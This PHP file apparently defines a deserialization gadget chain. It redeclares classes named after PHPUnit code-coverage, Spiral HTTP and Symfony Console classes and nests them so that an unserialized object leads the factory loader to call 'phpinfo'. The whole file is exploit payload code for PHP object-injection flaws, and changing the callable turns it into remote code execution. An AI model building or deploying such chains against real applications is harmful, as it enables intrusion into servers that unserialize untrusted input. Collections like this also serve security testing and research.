<?php

namespace App
{
	class App
	{
		protected $finalizer;

		function __construct()
		{
			$this->finalizer = new \SebastianBergmann\CodeCoverage\Report\Xml\Coverage();
		}
	}
}

namespace SebastianBergmann\CodeCoverage\Report\Xml
{
	class Coverage
	{
		private $writer;
		private $contextNode;

		function __construct()
		{
			$this->writer = new \XMLWriter;
			$this->contextNode = new \Spiral\Http\Request\InputManager();
		}
	}
}

namespace Spiral\Http\Request
{
	class InputManager
	{
		protected $container;

		function __construct()
		{
			$this->container = new \Symfony\Component\Console\CommandLoader\FactoryCommandLoader();
		}
	}
}

namespace Symfony\Component\Console\CommandLoader
{
	class FactoryCommandLoader
	{
		private $factories;
		function __construct()
		{
			$this->factories = ["Psr\Http\Message\ServerRequestInterface"=>"phpinfo"];
		}
	}
}